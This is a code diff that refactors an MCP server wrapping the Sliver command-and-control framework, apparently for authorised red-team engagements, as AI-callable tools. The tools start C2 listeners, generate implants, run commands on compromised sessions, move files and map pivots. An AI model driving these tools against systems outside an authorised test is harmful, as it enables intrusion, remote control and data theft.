@@ -24,21 +24,24 @@ _SSE_PORT = int(os.environ.get("SLIVER_SSE_PORT", "8023"))
 
 def _find_config() -> Path | None:
     """Locate the Sliver operator config file."""
-    # Default location
     default = _PROJECT_ROOT / "engagement" / "sliver.cfg"
     if default.exists():
         return default
     return None
 
 
-def _not_configured_msg() -> str:
-    return (
-        "ERROR: Sliver not configured for this engagement.\n"
-        "Run: config.sh and select Sliver as the shell backend,\n"
-        "or manually create engagement/sliver.cfg:\n"
-        "  sliver-server operator --name red-run --lhost 127.0.0.1 "
-        "--permissions all --save engagement/sliver.cfg"
-    )
+_NOT_CONFIGURED = (
+    "ERROR: Sliver not configured for this engagement.\n"
+    "Run: config.sh and select Sliver as the shell backend,\n"
+    "or manually create engagement/sliver.cfg:\n"
+    "  sliver-server operator --name red-run --lhost 127.0.0.1 "
+    "--permissions all --save engagement/sliver.cfg"
+)
+
+_NOT_CONNECTED = (
+    "ERROR: Failed to connect to Sliver daemon. "
+    "Ensure sliver-server daemon is running."
+)
 
 
 def create_server() -> FastMCP:
@@ -54,7 +57,6 @@ def create_server() -> FastMCP:
         ),
     )
 
-    # Shared async client — connected lazily on first tool call
     _client = None
     _client_lock = asyncio.Lock()
 
@@ -78,29 +80,19 @@ def create_server() -> FastMCP:
             except Exception:
                 return None
 
-    import functools
-
-    def _require_config(fn):
-        """Decorator that checks for Sliver config before calling tool."""
-        @functools.wraps(fn)
-        async def wrapper(*args, **kwargs):
-            if _find_config() is None:
-                return _not_configured_msg()
-            client = await _get_client()
-            if client is None:
-                return (
-                    "ERROR: Failed to connect to Sliver daemon. "
-                    "Ensure sliver-server daemon is running."
-                )
-            return await fn(client, *args, **kwargs)
-        return wrapper
+    async def _require_client() -> str | None:
+        """Check config + connection. Returns error string or None."""
+        if _find_config() is None:
+            return _NOT_CONFIGURED
+        client = await _get_client()
+        if client is None:
+            return _NOT_CONNECTED
+        return None
 
     # ── Listener management ─────────────────────────────────────────
 
     @mcp.tool()
-    @_require_config
     async def start_mtls_listener(
-        client,
         host: str = "0.0.0.0",
         port: int = 4444,
     ) -> str:
@@ -110,7 +102,10 @@ def create_server() -> FastMCP:
             host: Bind address (default 0.0.0.0).
             port: Bind port (default 4444).
         """
+        if err := await _require_client():
+            return err
         try:
+            client = await _get_client()
             listener = await client.start_mtls_listener(host=host, port=port)
             return json.dumps({
                 "status": "listening",
@@ -123,9 +118,7 @@ def create_server() -> FastMCP:
             return f"ERROR: Failed to start mTLS listener: {e}"
 
     @mcp.tool()
-    @_require_config
     async def start_https_listener(
-        client,
         host: str = "0.0.0.0",
         port: int = 443,
         domain: str = "",
@@ -137,7 +130,10 @@ def create_server() -> FastMCP:
             port: Bind port (default 443).
             domain: Optional domain for TLS certificate.
         """
+        if err := await _require_client():
+            return err
         try:
+            client = await _get_client()
             listener = await client.start_https_listener(
                 host=host, port=port, domain=domain
             )
@@ -152,10 +148,12 @@ def create_server() -> FastMCP:
             return f"ERROR: Failed to start HTTPS listener: {e}"
 
     @mcp.tool()
-    @_require_config
-    async def list_jobs(client) -> str:
+    async def list_jobs() -> str:
         """List active Sliver listener jobs."""
+        if err := await _require_client():
+            return err
         try:
+            client = await _get_client()
             jobs = await client.jobs()
             result = []
             for job in jobs:
@@ -170,14 +168,16 @@ def create_server() -> FastMCP:
             return f"ERROR: {e}"
 
     @mcp.tool()
-    @_require_config
-    async def kill_job(client, job_id: int) -> str:
+    async def kill_job(job_id: int) -> str:
         """Stop a listener job.
 
         Args:
             job_id: Job ID from list_jobs.
         """
+        if err := await _require_client():
+            return err
         try:
+            client = await _get_client()
             await client.kill_job(job_id)
             return json.dumps({"status": "killed", "job_id": job_id})
         except Exception as e:
@@ -186,9 +186,7 @@ def create_server() -> FastMCP:
     # ── Implant generation ──────────────────────────────────────────
 
     @mcp.tool()
-    @_require_config
     async def generate_implant(
-        client,
         target_os: str = "linux",
         arch: str = "amd64",
         mtls_host: str = "",
@@ -211,6 +209,8 @@ def create_server() -> FastMCP:
         """
         if not mtls_host:
             return "ERROR: mtls_host is required (attackbox callback IP)."
+        if err := await _require_client():
+            return err
 
         try:
             from sliver import client_pb2
@@ -237,9 +237,9 @@ def create_server() -> FastMCP:
                 Name=name or "",
             )
 
+            client = await _get_client()
             result = await client.generate_implant(config)
 
-            # Save to engagement/evidence/
             evidence_dir = _PROJECT_ROOT / "engagement" / "evidence"
             evidence_dir.mkdir(parents=True, exist_ok=True)
 
@@ -273,10 +273,12 @@ def create_server() -> FastMCP:
     # ── Session management ──────────────────────────────────────────
 
     @mcp.tool()
-    @_require_config
-    async def list_sessions(client) -> str:
+    async def list_sessions() -> str:
         """List all active Sliver sessions with metadata."""
+        if err := await _require_client():
+            return err
         try:
+            client = await _get_client()
             sessions = await client.sessions()
             result = []
             for s in sessions:
@@ -302,9 +304,7 @@ def create_server() -> FastMCP:
             return f"ERROR: {e}"
 
     @mcp.tool()
-    @_require_config
     async def execute(
-        client,
         session_id: str = "",
         exe: str = "",
         args: str = "",
@@ -320,8 +320,11 @@ def create_server() -> FastMCP:
         """
         if not session_id or not exe:
             return "ERROR: session_id and exe are required."
+        if err := await _require_client():
+            return err
 
         try:
+            client = await _get_client()
             session = await client.interact_session(session_id)
             if session is None:
                 return f"ERROR: Session {session_id} not found or dead."
@@ -342,9 +345,7 @@ def create_server() -> FastMCP:
             return f"ERROR: Command execution failed: {e}"
 
     @mcp.tool()
-    @_require_config
     async def upload(
-        client,
         session_id: str = "",
         local_path: str = "",
         remote_path: str = "",
@@ -358,12 +359,15 @@ def create_server() -> FastMCP:
         """
         if not session_id or not local_path or not remote_path:
             return "ERROR: session_id, local_path, and remote_path required."
+        if err := await _require_client():
+            return err
 
         local = Path(local_path)
         if not local.exists():
             return f"ERROR: Local file not found: {local_path}"
 
         try:
+            client = await _get_client()
             session = await client.interact_session(session_id)
             if session is None:
                 return f"ERROR: Session {session_id} not found or dead."
@@ -378,9 +382,7 @@ def create_server() -> FastMCP:
             return f"ERROR: Upload failed: {e}"
 
     @mcp.tool()
-    @_require_config
     async def download(
-        client,
         session_id: str = "",
         remote_path: str = "",
         local_path: str = "",
@@ -394,8 +396,11 @@ def create_server() -> FastMCP:
         """
         if not session_id or not remote_path:
             return "ERROR: session_id and remote_path are required."
+        if err := await _require_client():
+            return err
 
         try:
+            client = await _get_client()
             session = await client.interact_session(session_id)
             if session is None:
                 return f"ERROR: Session {session_id} not found or dead."
@@ -420,8 +425,7 @@ def create_server() -> FastMCP:
             return f"ERROR: Download failed: {e}"
 
     @mcp.tool()
-    @_require_config
-    async def ifconfig(client, session_id: str = "") -> str:
+    async def ifconfig(session_id: str = "") -> str:
         """List network interfaces on a Sliver session target.
 
         Useful for pivot detection — look for additional NICs/subnets.
@@ -431,8 +435,11 @@ def create_server() -> FastMCP:
         """
         if not session_id:
             return "ERROR: session_id is required."
+        if err := await _require_client():
+            return err
 
         try:
+            client = await _get_client()
             session = await client.interact_session(session_id)
             if session is None:
                 return f"ERROR: Session {session_id} not found or dead."
@@ -449,8 +456,7 @@ def create_server() -> FastMCP:
             return f"ERROR: {e}"
 
     @mcp.tool()
-    @_require_config
-    async def kill_session(client, session_id: str = "") -> str:
+    async def kill_session(session_id: str = "") -> str:
         """Terminate a Sliver session.
 
         Args:
@@ -458,8 +464,11 @@ def create_server() -> FastMCP:
         """
         if not session_id:
             return "ERROR: session_id is required."
+        if err := await _require_client():
+            return err
 
         try:
+            client = await _get_client()
             await client.kill_session(session_id)
             return json.dumps({
                 "status": "killed",
@@ -471,8 +480,7 @@ def create_server() -> FastMCP:
     # ── Pivot management ────────────────────────────────────────────
 
     @mcp.tool()
-    @_require_config
-    async def list_pivots(client, session_id: str = "") -> str:
+    async def list_pivots(session_id: str = "") -> str:
         """List pivot listeners on a session.
 
         Args:
@@ -480,8 +488,11 @@ def create_server() -> FastMCP:
         """
         if not session_id:
             return "ERROR: session_id is required."
+        if err := await _require_client():
+            return err
 
         try:
+            client = await _get_client()
             session = await client.interact_session(session_id)
             if session is None:
                 return f"ERROR: Session {session_id} not found or dead."
